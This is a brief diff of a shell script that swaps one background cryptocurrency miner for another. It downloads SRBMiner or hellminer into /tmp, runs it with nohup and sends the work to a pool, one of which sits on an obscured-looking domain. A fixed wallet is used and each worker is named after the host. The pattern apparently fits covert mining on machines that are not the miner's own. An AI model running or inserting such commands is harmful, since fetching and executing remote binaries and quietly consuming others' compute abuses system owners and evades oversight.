@@ -1,6 +1,4 @@
 cd /tmp
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-Linux.tar.gz
-tar -xvf SRBMiner-Multi-2-7-2-Linux.tar.gz
-cd SRBMiner-Multi-2-7-2
-nohup bash -c 'while true; do echo $(date) >> "$location/timer"; sleep 10; done' &
-nohup ./SRBMiner-MULTI --algorithm verushash --pool us.vipor.net:5040 --wallet RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH --password x --worker $(hostname -f) --cpu-threads 16 &
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+tar -xvf hellminer_linux64.tar.gz
+nohup ./hellminer -c stratum+ssl://dark-bikes-build-noisily.a276.dcdg.xyz:3958 -u RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH.$(hostname -f) -p x --cpu 4 &
